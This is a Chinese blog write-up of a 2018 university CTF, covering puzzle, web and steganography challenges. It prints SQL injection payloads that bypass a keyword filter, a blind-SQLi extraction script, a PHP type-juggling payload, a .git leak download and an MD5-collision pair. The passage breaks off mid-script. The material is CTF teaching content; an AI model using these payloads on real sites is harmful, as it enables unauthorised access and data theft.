@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>新疆师范大学第二届校内CTF比赛WP | xjseck&#39;s Home</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,出题," />
+  
+
+  <meta name="description" content="前言2017年6月份，是校内的第一场CTF比赛，当时的情况是没有对外开放，完成比赛的成品度不是很好，今年的情况相对比较好一些，出题的时间上比较赶，所以只是为了培养一些CTF入门题目和常规逻辑推理随带一些脑洞的题目，基于这两点就会发现题目的偏向，base类题目考查数学推理、谬论和CTF套路，misc考查常规的图片隐写，WEB则是考查http的一些常规的操作，PHP的一些黑魔法和CTF常见的一些byp">
+<meta name="keywords" content="CTF,出题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新疆师范大学第二届校内CTF比赛WP">
+<meta property="og:url" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/index.html">
+<meta property="og:site_name" content="xjseck&#39;s Home">
+<meta property="og:description" content="前言2017年6月份，是校内的第一场CTF比赛，当时的情况是没有对外开放，完成比赛的成品度不是很好，今年的情况相对比较好一些，出题的时间上比较赶，所以只是为了培养一些CTF入门题目和常规逻辑推理随带一些脑洞的题目，基于这两点就会发现题目的偏向，base类题目考查数学推理、谬论和CTF套路，misc考查常规的图片隐写，WEB则是考查http的一些常规的操作，PHP的一些黑魔法和CTF常见的一些byp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/base1.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/ssrf.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/web80.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/web100.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/misc50.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/misc80.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/misc801.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/misc8012.jpeg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/wp.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/wp1.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/wp2.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/wp3.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/wp4.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/1.jpg">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/2.jpg">
+<meta property="og:updated_time" content="2018-09-24T11:01:28.408Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="新疆师范大学第二届校内CTF比赛WP">
+<meta name="twitter:description" content="前言2017年6月份，是校内的第一场CTF比赛，当时的情况是没有对外开放，完成比赛的成品度不是很好，今年的情况相对比较好一些，出题的时间上比较赶，所以只是为了培养一些CTF入门题目和常规逻辑推理随带一些脑洞的题目，基于这两点就会发现题目的偏向，base类题目考查数学推理、谬论和CTF套路，misc考查常规的图片隐写，WEB则是考查http的一些常规的操作，PHP的一些黑魔法和CTF常见的一些byp">
+<meta name="twitter:image" content="https://www.xjseck.com/2018/09/23/新疆师范大学第二届校内CTF比赛WP/base1.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base题解"><span class="toc-text">Base题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web题解"><span class="toc-text">Web题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc题解"><span class="toc-text">misc题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#花絮"><span class="toc-text">花絮</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-新疆师范大学第二届校内CTF比赛WP" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">新疆师范大学第二届校内CTF比赛WP</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.09.23</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>xjseck</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+        <i class="icon-comment"></i> 
+        <span class="ds-thread-count" data-thread-key="post-新疆师范大学第二届校内CTF比赛WP"><i class="fa fa-spinner fa-spin"></i></span> 条评论
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2017年6月份，是校内的第一场CTF比赛，当时的情况是没有对外开放，完成比赛的成品度不是很好，今年的情况相对比较好一些，出题的时间上比较赶，所以只是为了培养一些CTF入门题目和常规逻辑推理随带一些脑洞的题目，基于这两点就会发现题目的偏向，base类题目考查数学推理、谬论和CTF套路，misc考查常规的图片隐写，WEB则是考查http的一些常规的操作，PHP的一些黑魔法和CTF常见的一些bypass绕过的一些知识。其余类的题目由于没有人来搞，所以就归到一类，让我师弟进行维护了。</p>
+<h2 id="Base题解"><a href="#Base题解" class="headerlink" title="Base题解"></a>Base题解</h2><p><strong>Base10</strong><br><img src="base1.png" alt="base"><br>提示靠边停车和网页源代码，<code>&lt;!-- flag{Math_is_Here_$num$!} 数字竟然被小车车挡住了,num=md5(num)[:5]--&gt;</code>如果从图片中没有读到有用的信息，但是可以从这个源码可以看出很像BP爆破选中的参数，已经很明确了，就是推出小车挡住的数字的MD5值的前5位。考查思维发散，把图片倒过来就知道数字是87了。</p>
+<p><strong>Base20</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Tom 和 Bob 共同的朋友Jack生日快到了，他两想知道Jack的生日，但是他俩都不知道，但是Jack 给了他俩一个生日的列表,让他俩进行推算</span><br><span class="line">May 15 May 16 May 19</span><br><span class="line">June 17 June 18</span><br><span class="line">July 14 July 16</span><br><span class="line">August 14 August 15 August 17</span><br><span class="line">Jack分别告诉了Tom月份，Bob日期</span><br><span class="line">Tom： 我不知道Jack 的生日，我知道Bob也不知道。</span><br><span class="line">Bob： 首先我也不知道Jack的生日，但是我知道日期。</span><br><span class="line">Tom： 一开始我不知道，现在我知道Jack的生日了</span><br><span class="line">Bob: 那我也知道了</span><br><span class="line">flag&#123;Th0_Jack_Birth_Is_月_日&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这道题算是纯的一道数学题了，本来是要考大家数学推理和谬论的但是发现一些人就是按ctf的解题套路了，直接爆破。<br>这里说一下数学推理的过程：</p>
+<ul>
+<li>两个人分别知道了日期和月份，然后在谈话的过程中都知道了具体的生日</li>
+<li>第一句话说：Tom： 我不知道Jack 的生日，我知道Bob也不知道。<br>首先可以排除19号 和18号如果是这两个日期，Bob就知道了Jack的生日了，进而可以排除5月和6月，因为Tom肯定的知道Bob是不知道Jack的生日的，如果是5月或者6月的话，就会出现18号和19号，Tom就不能肯定Bob知不知道Jack 的生日。</li>
+<li>排除5月和6月之后，剩下7月和8月，相同的14号排除，如果出现15号或者是17号就不能确定jack的生日，只有是7月16号，可以唯一的确定jack的生日，他两最后都明确的知道了生日。</li>
+</ul>
+<p><strong>Base30</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:)内心有点小崩溃。</span><br><span class="line">请计算1000000000以内3或5的倍数之和。</span><br><span class="line"></span><br><span class="line">如：10以内这样的数有3,5,6,9，和是23</span><br><span class="line"></span><br><span class="line">请提交flag&#123;你的答案&#125;</span><br></pre></td></tr></table></figure></p>
+<p>用c的long型或者python的xrange都可以跑出来具体的值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  xrange(<span class="number">1</span>,<span class="number">1000000000</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span>==<span class="number">0</span> <span class="keyword">or</span> i%<span class="number">5</span>==<span class="number">0</span>:</span><br><span class="line">        sum=sum+i</span><br><span class="line"><span class="keyword">print</span> sum</span><br><span class="line"><span class="comment">#flag&#123;233333333166666668&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Base40</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你一串16进制让你玩玩</span><br><span class="line">666c61677b4a7573745f743373745f683476335f66346e5f6861686168615f36363636217d</span><br></pre></td></tr></table></figure></p>
+<p>这道题就很简单了<br>直接16进制转ascii码就可以了</p>
+<p><strong>Base50</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目：小明常用密码是hash 是5bc76f3f319865431dcab801bbce47a1 现在 他只知道明文密码的前四位是xjnu</span><br><span class="line">中间是66****88 后三位是ctf 请帮他算出 明文密码是啥</span><br><span class="line">flag&#123;明文&#125;</span><br></pre></td></tr></table></figure></p>
+<p>思路只要爆破四位然后整个串进行md5加密，最后进行比较就可以了，知道思路后，撸一个脚本就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">hash=<span class="string">'5bc76f3f319865431dcab801bbce47a1'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_Eecode</span><span class="params">(str)</span>:</span></span><br><span class="line">    md=hashlib.md5()</span><br><span class="line">    md.update(str)</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        <span class="keyword">for</span> x3 <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">for</span> x4 <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">                pwd = <span class="string">'xjnu66'</span>+x1+x2+x3+x4+<span class="string">'88ctf'</span></span><br><span class="line">                <span class="keyword">if</span> md5_Eecode(pwd)==hash:</span><br><span class="line">                    <span class="keyword">print</span> pwd</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Web题解"><a href="#Web题解" class="headerlink" title="Web题解"></a>Web题解</h2><p><strong>web10</strong><br><code>http://ctf.xjnu.edu.cn:9900/web10/</code>简单的sql注入，使用sqlmap跑一下就可以了<br><strong>web20</strong><br>页面提示，你不属于这，修改一下xxf，页面提示没有登录，但是登录框什么的都没有，使用bp抓包，发现Cookie:login=0，修改一下<br>发现不是<code>很可惜你不是iPhone OS 999</code>，继续修改一下ua，<code>Mozilla/5.0 (iPhone; CPU iPhone OS 999 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25</code>  坑点就是需要一完整的iPhone的ua和变一下数字<br><strong>参考hctf</strong><br><strong>web30</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.xjnu.edu.cn:9900/web30/</span><br><span class="line">小明shell下的编辑器用的比较6</span><br></pre></td></tr></table></figure></p>
+<p>考察文件备份和url的保留字和PHP的一些黑魔法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$get = $_GET[<span class="string">'ctf'</span>];</span><br><span class="line"><span class="keyword">if</span> ($get == <span class="string">'!#?&amp;@'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt; class="alert"&gt;Go on!&lt;/p&gt;'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password is error,must be test others&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">        $a = @$_GET[<span class="string">'xjnu'</span>];</span><br><span class="line">        $v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_array($a)) &#123;</span><br><span class="line">            is_numeric(@$a[<span class="string">"bar1"</span>]) ? <span class="keyword">die</span>(<span class="string">"No way!"</span>) : <span class="keyword">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> (@$a[<span class="string">"bar1"</span>]) &#123;</span><br><span class="line">                ($a[<span class="string">"bar1"</span>] &gt; <span class="number">2016</span>) ? $v1 = <span class="number">1</span> : <span class="keyword">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_array(@$a[<span class="string">"bar2"</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (count($a[<span class="string">"bar2"</span>]) !== <span class="number">3</span> <span class="keyword">or</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"No way!"</span>);</span><br><span class="line">                <span class="keyword">foreach</span> ($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (preg_match(<span class="string">'/2018/'</span>, $val)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">'No way!'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ($val == <span class="number">2018</span>) &#123;</span><br><span class="line">                        <span class="keyword">die</span>($flag);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>payload：</strong><code>php?ctf=%21%23%3F%26@&amp;password=a%00--&amp;xjnu[bar1]=2017e&amp;xjnu[bar2][][]=xjnu&amp;xjnu[bar2][]=1a&amp;xjnu[bar2][]=2017.9999999999999999999999999999999999</code></p>
+<p><strong>Web40</strong><br>出题有点问题，详细的思路看Web80<br>这里直接githack直接取出flag</p>
+<p><strong>Web50</strong><br>题目提示注入密码，源代码提示<code>&lt;!-- password  columns--&gt;</code>,目的很明确了，应该是直接把password字段里面的记录注入出来就可以了。<br>过滤的有点多，,详细判断一下过滤关键字，首先使用admin登录密码错误，发现是pass error，使用其他的用户名就会发现没有no such user，后面加空之类的关键字，发现是waf，常规的跑一下sql的字典，可以发现select、from、%0a、%0b、%a0、mid、substring等都过滤了，但是只是为了注入出密码应该会有好多种思路，比如left和正则<br><code>payload：user=admin&#39;/**/%26%26/**/left(password,1)=&#39;5&#39;/**/%26%26/**/&#39;1&#39;=&#39;1&amp;pwd=2121</code><br><code>payload:user=admin&#39;%09%26%26%09password%09regexp/**/&#39;^57.*&#39;%09%26%26%09&#39;1&#39;=&#39;1&amp;pwd=121</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">pwd_str=string.ascii_lowercase+<span class="string">"0123456789"</span></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://ctf.xjnu.edu.cn:9900/web50/"</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pwd_str:</span><br><span class="line">        username=<span class="string">r"admin'/**/&amp;&amp;/**/password/**/regexp/**/'^&#123;0&#125;.*'/**/&amp;&amp;/**/'1'='1"</span>.format(password+i)</span><br><span class="line">        <span class="comment"># username="admin'%09%26%26%09password%09regexp/**/'^"+'5'+".*'%09'1'='1"</span></span><br><span class="line">        <span class="comment"># print username</span></span><br><span class="line">        sql_payload=&#123;</span><br><span class="line">            <span class="string">'user'</span>:username,</span><br><span class="line">            <span class="string">'pwd'</span>:<span class="string">"121"</span></span><br><span class="line">        &#125;</span><br><span class="line">        proxy=&#123;<span class="string">"http"</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line">        <span class="comment"># print sql_payload</span></span><br><span class="line">        res=requests.post(url,data=sql_payload)</span><br><span class="line">        <span class="comment"># print res.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            password=password+i</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[*Password]:"</span>,password</span><br></pre></td></tr></table></figure></p>
+<p><strong>Web60</strong><br>这一道题是上一届的原题，之前没有做出来，结果就继续修改了一下放了出来，主要考察的是渗透测试过程中，对目标站点的一个whois信息收集的技巧，和HOST头的虚拟站点的考察，首先需要进行HOST头域名和ip地址的绑定，然后测试发现，直接对edu.cn的域名进行whois是不会有数据的，那我们可以对ip地址进行whois，结果就能找到注册人的邮箱，之后就是ssrf进行探测，直接输入<br><img src="ssrf.jpeg" alt="ssrf">可以发现是跳转到百度的，紧接着就应该想到php的file协议是否可以读文件，爆破一下可以应该可以知道，file小写被过滤，大写可以绕过进文件的读取，先读取index.php发现有一个flag_ssRf.php，读取此文件，查看源代码。主要考察file协议对大小写不敏感。<br><strong>Web80</strong><br>是校内赛结束之后放出来的一道题，主要是因为Web40，出题失误，导致的git复仇，首先看一下出题的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">目录下先有index.php flag_Revenge_2333333.php  flag.php</span><br><span class="line"> 9608* git init</span><br><span class="line"> 9609* git add .</span><br><span class="line"> 9610* git commit -m &quot;xjseck&quot;</span><br><span class="line"> 然后删除另外两个文件</span><br><span class="line"> 9611* rm -rf flag_Revenge_2333333.php</span><br><span class="line"> 9612* rm -rf flag.php</span><br><span class="line"> 9613* git commit -m &quot;remove something&quot;</span><br><span class="line"> 9614* git add .</span><br><span class="line">解题思路让别人只能通过下载.git的所有文件，进行查看flag文件名称，进行访问，然后解题</span><br></pre></td></tr></table></figure></p>
+<p>然后把git目录可以进行列文件目录，所以如果直接使用githack脚本只能跑出一个index.php文件，什么都没有，所以之后下载.git所有文件，然后通过查看commit的操作才可以，操作如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -r -nH -e html_extension=off --reject &apos;*.html*&apos; &apos;http://ctf.xjnu.edu.cn:9900/web80/.git/&apos;</span><br><span class="line">git log</span><br><span class="line">git log --stat bcf528e</span><br></pre></td></tr></table></figure></p>
+<p><img src="web80.jpeg" alt="web80"><br>其实再难一些就是需要爆破一下，使用<code>git cat-file -p 9ac836</code>的操作发现flag文件，接着访问flag文件会发现，其实是一道强网杯的一道题，google MD5攻击的论文，直接给出payload好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></p>
+<p><strong>web100</strong><br>主要考察php文件包含，只要你懂所包含的文件里面的内容有php格式和语法在就能够执行，这样来说你就会很简单的getshell，其实没有想考大家使用php的伪协议，zip和phar协议的。<br><img src="web100.jpeg" alt=""></p>
+<h2 id="misc题解"><a href="#misc题解" class="headerlink" title="misc题解"></a>misc题解</h2><p>出题思路是想让大家把图片隐写类的题目进行一个操作步骤上的汇总，先使用什么后使用什么进行检测分析的一个过程和笔记。</p>
+<ol>
+<li>拿到图片文件，strings 和文本文档开的一下图片ascii内容或者汉字等信息</li>
+<li>exiftool 查看图片属性 是否隐藏的有base64 和进制等信息。</li>
+<li>上面无果之后使用 binwalk一下图片隐藏的文件.</li>
+<li>使用stegsolve 查看图片通道,检查pngcheck 一下idat 数据块是否正常一般是查看png 和 bmp</li>
+<li>Stegdetect.exe -tjopi -s 100.0 *.jpg  </li>
+<li>如果主办方给的原题图片不能浏览，可以尝试改后缀名或者不要后缀名，让计算机自动识别（linux）。</li>
+<li>十六进制手动查看，提取文件可以尝试保存文件为doc或者txt之类的或者不加后缀。</li>
+<li>如果遇见pdf或者doc 的文件 ctrl+A选中所有字符，可能显示flag</li>
+<li>如果有两张相似的图片可以使用XOR、ADD、SUB等操作，或者水印模糊的图片。</li>
+</ol>
+<p><strong>misc10</strong><br>微博关注一下，然后私信，一些关键词<code>flag、ctf、新疆师范大学等</code>都能出flag</p>
+<p><strong>misc15</strong><br>查看图片属性版权出flag,或者strings</p>
+<p><strong>misc20</strong><br>图种，把另一张图片提取出来，出flag，考察图片文件头标识,binwalk也可以看出是两张图片</p>
+<p><strong>misc30</strong><br>考察strings不行，我们可以记事本打开图片内容显示中文，后面就是翻一翻马哲的书了，2018版才可以<br><img src="misc50.jpeg" alt=""></p>
+<p><strong>misc40</strong><br>word文档其实就是一个zip文件，改后缀，打开出flag，还有就是隐藏的有字体，也是一个思路</p>
+<p><strong>misc50</strong><br>一个wooyun的邮箱注册号图片，纪念一下而已，一道很简单的lsb隐写，使用stegsolve，选中lsb和bgr<br><img src="misc80.jpeg" alt=""><br>或者使用zsteg<br><img src="misc801.jpeg" alt=""></p>
+<p><strong>misc80</strong><br>直接给了一个二维码，扫出来肯定什么都没有了，strings一下文件，发现后面一堆的数字，且都是0-7，应该可以肯定是8进制，拿<br><img src="misc8012.jpeg" alt=""><br>这么多串数字肯定不能手工了吧，简单的编写一个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">encode_str=<span class="string">"146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(encode_str),<span class="number">3</span>):</span><br><span class="line">    <span class="comment"># flag+=int(encode_str[i:i+3],8)</span></span><br><span class="line">    <span class="keyword">print</span> 